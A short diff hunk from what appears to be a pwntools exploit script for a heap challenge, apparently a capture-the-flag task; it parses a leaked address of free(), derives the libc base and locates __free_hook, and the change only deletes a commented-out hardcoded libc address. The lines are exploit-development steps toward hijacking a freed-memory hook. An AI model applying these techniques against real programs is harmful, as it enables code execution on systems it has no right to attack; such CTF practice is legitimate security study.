@@ -196,7 +196,6 @@ io.recvuntil('Weapon : ')
 free_address = u64(io.recvn(8))
 if free_address != libc.symbols['free']:
     libc.address = free_address - libc.symbols['free']
-# libc.address = 0x7ffff6f5d000 TODO
 success('libc.address: %s' % hex(libc.address))
 __free_hook_address = libc.symbols['__free_hook']
 success('__free_hook_address: %s' % hex(__free_hook_address))
